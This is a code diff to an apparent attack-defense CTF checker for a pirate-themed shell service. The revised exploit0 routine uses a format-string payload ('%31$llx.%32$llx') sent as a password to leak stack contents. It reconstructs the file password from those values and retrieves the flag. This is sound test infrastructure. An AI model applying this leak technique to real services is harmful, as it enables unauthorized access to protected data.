@@ -138,6 +138,9 @@ async def putflag_note(
     conn.writer.write(f"dock".encode())
     await conn.writer.drain()
 
+    # Store the file in attack_info
+    return f"{directory} {filename}.treasure"
+
 @checker.getflag(0)
 async def getflag_note(
     task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
@@ -180,98 +183,62 @@ async def getflag_note(
 @checker.exploit(0)
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
 
+    logger.debug(f"Exploiting: {task.attack_info}" )
+
+    treasure_dir, treasure_file = task.attack_info.split(' ')
+    
     await conn.reader.readuntil(b"$ ")
     
-    # Get the directories
-    directories = await conn.get_dirs()
-    logger.debug(f"Directories output: {directories}")
+    # Go to the directory
+    conn.writer.write(f'sail {treasure_dir}\n'.encode())
+    await conn.writer.drain()
+    await conn.reader.readuntil(b"$ ")
 
-    treasure_dir = {}
+    # Try to plunder the file
+    conn.writer.write(f'loot {treasure_file}\n'.encode())
+    await conn.writer.drain()
     
-    # Loop through each directory and scout for .treasure files
-    for directory in directories:
-        conn.writer.write(f'scout {directory}\n'.encode())
-        await conn.writer.drain()
-        scout_output = (await conn.reader.readuntil(b"$ ")).decode()
+    # Handle the output and wait for the password prompt
+    await conn.reader.readuntil(b": ")
 
-        # Check if there is a .treasure file in the directory
-        if '.treasure' in scout_output:
-            logger.debug(f".treasure file found in {directory}")
-            treasure_dir[directory] = []
-            # find the full name of the treasure file and append it to the list
-            scout_output = scout_output.replace('\r', '').split('\n')
-            for line in (scout_output):
-                if '.treasure' in line:
-                    treasure_dir[directory].append(line)
+    # Send the format string exploit as the password
+    conn.writer.write(b'%31$llx.%32$llx\n')
+    await conn.writer.drain()
+
+    # Read the buffer to get the incorrect password message
+    incorrect_message = (await conn.reader.readuntil(b"$ ")).decode()
+
+    # Extract the two addresses from the incorrect message
+    address1_hex, address2_hex = incorrect_message.split(' ')[0].split('.')
+
+    # Convert the addresses to ASCII and reverse them
+    address1 = bytes.fromhex(address1_hex).decode()[::-1]
+    address2 = bytes.fromhex(address2_hex).decode()[::-1]
+
+    # Print the password
+    password = f'{address1}{address2}'
+
+    # Now try to plunder the file again
+    conn.writer.write(f'loot {treasure_file}\n'.encode())
+    await conn.writer.drain()
+    await conn.reader.readuntil(b": ")
+
+    conn.writer.write(f'{password}\n'.encode())
+    await conn.writer.drain()
     
-    # if treasure_dir is still empty, report mumble exception
-    if len(treasure_dir) == 0:
-        raise MumbleException("No .treasure files found")
+    # Wait for the output and print it
+    result = await conn.reader.readuntil(b"$ ")
 
+    # Check for the flag in the result
+    if flag := searcher.search_flag(result):
+        return flag
 
-    result_text = ""
+    # Exit the directory
+    conn.writer.write('sail ..\n'.encode())
+    await conn.writer.drain()
+    await conn.reader.readuntil(b"$ ")
 
-    
-    # For each directory, try to loot the treasure
-    for directory in treasure_dir:
-
-        # Change to the directory and loot the treasure
-        conn.writer.write(f'sail {directory}\n'.encode())
-        await conn.writer.drain()
-        await conn.reader.readuntil(b"$ ")
-
-        # For each file in the directory, try to loot it
-        for treasure_file in treasure_dir[directory]:
-
-            conn.writer.write(f'loot {treasure_file}\n'.encode())
-            await conn.writer.drain()
-            
-            # Handle the output and wait for the password prompt
-            await conn.reader.readuntil(b": ")
-
-            # Send the format string exploit as the password
-            conn.writer.write(b'%31$llx.%32$llx\n')
-            await conn.writer.drain()
-
-            # Read the buffer to get the incorrect password message
-            incorrect_message = (await conn.reader.readuntil(b"$ ")).decode()
-
-            # Extract the two addresses from the incorrect message
-            address1_hex, address2_hex = incorrect_message.split(' ')[0].split('.')
-
-            # Convert the addresses to ASCII and reverse them
-            address1 = bytes.fromhex(address1_hex).decode()[::-1]
-            address2 = bytes.fromhex(address2_hex).decode()[::-1]
-
-            # Print the password
-            password = f'{address1}{address2}'
-            logger.debug(f'Incorrect message: {incorrect_message}\nAddress 1 Hex: {address1_hex}\nAddress 2 Hex: {address2_hex}\nPassword: {password}')
-
-            # Now try to plunder the file again
-            conn.writer.write(f'loot {treasure_file}\n'.encode())
-            await conn.writer.drain()
-            await conn.reader.readuntil(b": ")
-
-            conn.writer.write(f'{password}\n'.encode())
-            await conn.writer.drain()
-            
-            # Wait for the output and print it
-            result = await conn.reader.readuntil(b"$ ")
-            logger.debug(result.decode())
-
-            # Check for the flag in the result
-            if flag := searcher.search_flag(result):
-                return flag
-            
-            # If the flag was not found, add the result to the result_text
-            result_text += result.decode()
-        
-        # Exit the directory
-        conn.writer.write('sail ..\n'.encode())
-        await conn.writer.drain()
-        await conn.reader.readuntil(b"$ ")
-
-    raise MumbleException("flag not found. Output: " + result_text)
+    raise MumbleException("flag not found")
 
 
 if __name__ == "__main__":
